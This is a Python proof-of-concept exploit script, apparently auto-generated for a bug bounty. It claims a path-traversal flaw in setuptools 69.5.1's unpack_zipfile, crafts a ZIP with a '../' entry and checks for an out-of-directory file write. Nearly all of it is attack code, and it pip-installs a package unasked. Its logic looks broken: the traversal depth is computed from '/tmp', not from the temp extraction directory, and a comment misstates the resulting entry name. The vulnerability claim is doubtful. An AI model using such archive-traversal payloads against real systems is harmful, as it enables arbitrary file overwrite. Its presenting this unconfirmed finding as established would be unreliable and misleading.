#!/usr/bin/env python3
# PoC for setuptools-69.5.1 (/tmp/bounty_test/setuptools-69.5.1)
# Path: afo-000
# Sink: unpack_zipfile
# Auto-generated — run with: python3 afo_there_check_unpack_zipfile.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for setuptools-69.5.1 path traversal vulnerability (AFO).

This script demonstrates how an attacker can craft a malicious ZIP archive that,
when extracted by the vulnerable unpack_zipfile function, overwrites arbitrary
files outside the intended extraction directory.

Vulnerability: The unpack_zipfile function in setuptools/archive_util.py does not
validate zip entry names for path traversal sequences (e.g., '../'). The zipfile
module trusts entry names by default, allowing an attacker to control the
destination path.

Impact: Arbitrary file write/overwrite outside the extraction directory.

Usage:
    python poc_setuptools_afo.py [target_zip_path]

    If no target path is provided, the script creates a malicious zip in /tmp
    and demonstrates the vulnerability locally.

Note: This PoC uses a benign payload (creates /tmp/poc_success.txt) to
demonstrate the vulnerability without causing harm.
"""

import os
import sys
import zipfile
import tempfile
import shutil

# Configuration
TARGET_DIR = "/tmp"  # Extraction directory (attacker-controlled in real scenario)
PAYLOAD_FILE = "/tmp/poc_success.txt"  # Benign file to create as proof
MALICIOUS_ZIP = "/tmp/malicious.zip"  # Path for the crafted zip


def create_malicious_zip(zip_path: str, payload_path: str) -> None:
    """
    Create a ZIP archive with a path traversal entry.

    The entry name contains '../' sequences to escape the extraction directory
    and write to an arbitrary location.

    Args:
        zip_path: Path where the malicious ZIP will be created
        payload_path: The target file path to write (will be traversed to)
    """
    # Calculate how many '../' we need to reach the root from TARGET_DIR
    # For /tmp, we need one level up to reach /
    traversal_depth = len(TARGET_DIR.strip("/").split("/"))
    traversal_prefix = "../" * traversal_depth

    # The entry name will be: ../../../tmp/poc_success.txt
    entry_name = f"{traversal_prefix}{payload_path.lstrip('/')}"

    print(f"[*] Creating malicious ZIP: {zip_path}")
    print(f"[*] Entry name with path traversal: {entry_name}")
    print(f"[*] Target file to create: {payload_path}")

    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        # Add a benign file with the traversal path
        zf.writestr(entry_name, "pwned\n")

    print(f"[+] Malicious ZIP created successfully")


def exploit_vulnerability(zip_path: str, extract_dir: str) -> bool:
    """
    Trigger the vulnerable unpack_zipfile function with the malicious ZIP.

    This simulates an attacker providing a crafted ZIP to an application
    that uses setuptools' unpack_zipfile.

    Args:
        zip_path: Path to the malicious ZIP file
        extract_dir: Directory where extraction is attempted

    Returns:
        True if the payload file was created (vulnerability confirmed)
    """
    # Import the vulnerable function from setuptools
    # Note: This requires setuptools to be installed
    try:
        from setuptools.archive_util import unpack_zipfile
    except ImportError:
        print("[!] setuptools not found. Installing...")
        import subprocess
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", "setuptools==69.5.1"]
        )
        from setuptools.archive_util import unpack_zipfile

    print(f"[*] Extracting {zip_path} to {extract_dir}")
    print("[*] Calling vulnerable unpack_zipfile...")

    try:
        unpack_zipfile(zip_path, extract_dir)
        print("[+] Extraction completed (no exception raised)")
    except Exception as e:
        print(f"[!] Extraction raised exception: {e}")
        return False

    # Check if the payload file was created outside the extraction directory
    if os.path.exists(PAYLOAD_FILE):
        print(f"[!] VULNERABILITY CONFIRMED: {PAYLOAD_FILE} was created!")
        print(f"[!] File contents: {open(PAYLOAD_FILE).read()}")
        return True
    else:
        print(f"[-] Payload file {PAYLOAD_FILE} not found")
        return False


def cleanup():
    """Remove created files."""
    for path in [MALICIOUS_ZIP, PAYLOAD_FILE]:
        if os.path.exists(path):
            os.remove(path)
            print(f"[*] Cleaned up: {path}")


def main():
    """Main execution flow."""
    print("=" * 60)
    print("setuptools-69.5.1 Path Traversal PoC (AFO)")
    print("=" * 60)

    # Parse command line argument for target zip path
    if len(sys.argv) > 1:
        zip_path = sys.argv[1]
        print(f"[*] Using provided ZIP path: {zip_path}")
    else:
        zip_path = MALICIOUS_ZIP
        print(f"[*] Using default ZIP path: {zip_path}")

    # Create a temporary extraction directory
    extract_dir = tempfile.mkdtemp(prefix="setuptools_poc_")
    print(f"[*] Extraction directory: {extract_dir}")

    try:
        # Step 1: Create the malicious ZIP
        create_malicious_zip(zip_path, PAYLOAD_FILE)

        # Step 2: Exploit the vulnerability
        success = exploit_vulnerability(zip_path, extract_dir)

        # Step 3: Report results
        if success:
            print("\n[!] VULNERABILITY EXPLOITABLE: Path traversal successful!")
            print("[!] An attacker could overwrite arbitrary files on the system.")
        else:
            print("\n[-] Vulnerability not confirmed (may be patched or mitigated)")

    finally:
        # Cleanup
        cleanup()
        if os.path.exists(extract_dir):
            shutil.rmtree(extract_dir)
            print(f"[*] Cleaned up extraction directory: {extract_dir}")

    print("\n[*] PoC completed.")


if __name__ == "__main__":
    main()
